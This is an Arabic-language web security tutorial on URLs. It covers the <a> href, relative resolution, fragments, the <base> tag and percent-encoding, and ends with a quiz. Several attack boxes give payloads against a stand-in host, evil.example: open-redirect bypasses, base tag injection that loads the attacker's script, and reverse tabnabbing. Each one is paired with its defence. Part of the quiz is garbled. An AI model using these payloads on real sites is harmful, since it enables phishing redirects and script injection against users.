الروابط والـ URLs: من فين لفين بالظبط؟

الـ «Hyper» في HyperText هو الروابط. والـ URL نفسه لغة صغيرة ليها parser وقواعد — والفرق بين اللي المطوّر فاكره واللي المتصفح بيعمله فعلًا هو مصدر ثغرات زي open redirect وbase hijacking وtabnabbing. في الدرس ده هتبقى تقرا أي URL زي المتصفح بالظبط.

الـ <a> والـ href

<a href="URL">نص اللينك</a>. الـ href هو الوجهة، والنص هو اللي المستخدم بيشوفه. النص والوجهة ملهمش علاقة ببعض — ممكن النص يقول bank.example واللينك يروح في حتة تانية خالص (أساس الـ phishing). عشان كده اتعلّم دايمًا تبص على الـ href الحقيقي (hover وشوف شريط الحالة، أو من الـ source).

Absolute vs Relative

الـ absolute URL فيه scheme (https://…). الـ relative بيتحسب من «الـ base» — اللي هو عادة عنوان الصفحة الحالية. لو الصفحة الحالية https://shop.example/products/shoes/index.html:

🎯
Open redirect: «بيبدأ بـ / يبقى آمن»… غلط

موقع بيعمل redirect لـ ?next= بعد الـ login، والمطوّر «حمى» نفسه بإنه يتأكد إن القيمة بتبدأ بـ /. المهاجم يبعت next=//evil.example — بتبدأ بـ / فعلًا، بس المتصفح بيقراها protocol-relative ويروح evil.example. وفي المتصفحات /\evil.example كمان بتشتغل لأن الـ \ بتتعامل زي / في URLs الـ http. جرّبهم في الـ URL Inspector فوق.

الـ Fragments والـ ids

أي عنصر عليه id="x" تقدر تعمله لينك بـ #x — المتصفح بيعمل scroll ليه من غير ما يطلب حاجة من السيرفر (و#top أو # بيطلعوك لأول الصفحة). الـ fragment ده للمتصفح بس: مبيظهرش في الـ request ولا في logs السيرفر. وفيه كمان text fragments في Chrome: #:~:text=كلمة بتعمل scroll وhighlight لكلمة في الصفحة.

🎯
ليه الـ fragment مهم أمنيًا؟

(1) بما إنه مبيتبعتش للسيرفر، الـ WAF والـ logs مبيشوفوش أي payload فيه. (2) لو JavaScript في الصفحة بياخد location.hash ويحطه في الـ DOM، يبقى عندك DOM XSS مايبانش في أي request. (3) الـ OAuth القديم (implicit flow) كان بيرجّع الـ access_token في الـ fragment.

🎯
Reverse tabnabbing

زمان: لينك target="_blank" لموقع المهاجم كان بيدّي الصفحة الجديدة window.opener — فتقدر تعمل opener.location = "https://bank-login.example" وتغيّر الـ tab الأصلي لصفحة phishing وهو في الخلفية! المتصفحات الحديثة (Chrome 88+، Firefox 79+، Safari 12.1+) بقت تعتبر target="_blank" = noopener تلقائيًا. بس window.open() من JavaScript لسه بيدّي opener، والتطبيقات القديمة/الـ webviews ممكن تكون عرضة — فاكتب rel="noopener noreferrer" صراحة، وفي الـ pentest دوّر على الحالات اللي الـ opener فيها لسه موجود.

الـ <base>: تغيير مرجع كل الـ relative URLs

<base href="https://cdn.example/v2/"> جوه الـ head بيخلّي كل relative URL في الصفحة (لينكات، صور، scripts، forms) يتحسب منه بدل عنوان الصفحة. ممكن كمان <base target="_blank">. القاعدة: أول base عليه href هو اللي بيتحسب، والباقي متجاهل.

🎯
Base tag injection

لو عندك HTML injection في الـ head (أو قبل أي script)، ومش قادر تحط <script> بسبب فلتر — جرّب <base href="https://evil.example/">. أي <script src="/static/app.js"> بعدها هيتحمّل من https://evil.example/static/app.js = سيرفرك = كودك بيشتغل. الحماية: CSP فيها base-uri 'none' أو 'self'.

الـ Percent-encoding

الـ URL مسموح فيه حروف ASCII معينة بس. أي حاجة تانية (مسافة، عربي، أو حرف ليه معنى خاص زي & و# و? لو عايزه كقيمة) بتتكتب %HH = الـ byte بالـ hex. الحروف غير الـ ASCII بتتحول UTF-8 bytes الأول: «ا» = %D8%A7.

المستخدم فتح `https://shop.example/search?q=shoes#results`. إيه اللي بيوصل للسيرفر؟ `/search?q=shoes#results` `/search` بس `/search?q=shoes` `#results` بس الـ fragment (`#…`) بيفضل في المتصفح. السيرفر بيشوف الـ path والـ query بس. الـ fragment عمره ما بيتبعت في الـ HTTP request. الـ path والـ query هما اللي بيتبعتوا. الصفحة الحالية `https://a.example/x/y/page.html`. لينك `href="../z.html"` هيروح فين؟ `https://a.example/x/z.html` `https://a.example/z.html` `https://a.example/x/y/z.html` `https://a.example/x/y/../z.html` زي ما هو الـ directory الحالي `/x/y/`، و`../` بتطلع لـ `/x/`. والـ `..` بتتحل قبل الإرسال. ابدأ من الـ directory (`/x/y/`)، اطلع مستوى واحد (`/x/`)، وضيف `z.html`. السيرفر بيسمح بأي `next` بيبدأ بـ `/` عشان «يمنع» الـ redirect لمواقع تانية. أنهي قيمة هتودّي المستخدم لـ `evil.example`؟ `/evil.example` `/./evil.example` `/%65vil.example` `//evil.example` `//evil.example` protocol-relative: نفس الـ scheme، host مختلف. (و`/\evil.example` كمان بتشتغل في المتصفحات.) الحل الصح: allow-list للـ paths، أو parse الـ URL والتأكد إن الـ origin هو نفسه. `/evil.example` و`/./evil.example` paths عادية على نفس الموقع. الـ `//` في الأول هي اللي بتخلّي اللي بعدها host. إيه الفرق بين `rel="noopener"` و`rel="noreferrer"`؟ مفيش فرق `noopener` بيقطع `window.opener` بس، و`noreferrer` بيمنع الـ `Referer` header + بيعمل noopener كمان `noreferrer` بيمنع فتح tab جديد `noopener` بيمنع الـ cookies صح. والاتنين مع بعض هو الاختيار الآمن للينكات الخارجية. `noopener` = الصفحة الجديدة ملهاش reference لصفحتك. `noreferrer` = كمان مفيش Referer (وضمنيًا noopener). في صفحة فيها `` قبل ` الـ `"` في الـ payload قفلت قيمة الـ `content`، والـ `>` قفلت الـ meta. يعني اللي بعدها element جديد فعلًا. الـ payload `">` خرج من الـ attribute وعمل `base` element حقيقي في الـ head — قبل الـ script. فـ `/static/app.js` بقت `https://evil.example/static/app.js` = كود المهاجم. ده base tag hijacking، وبيشتغل حتى لو كل الـ `<script` ممنوعة. الدفاع: encoding صح للـ `"` جوه الـ attribute + CSP بـ `base-uri 'none'`.

صفحة تانية على نفس الموقع (https://shop.example/search?q=…) بتحط كلمة البحث جوه الـ title، ومن غير أي encoding. المهاجم بعت نفس الفكرة. الـ app.js هيتحمّل من أنهي URL المرة دي؟
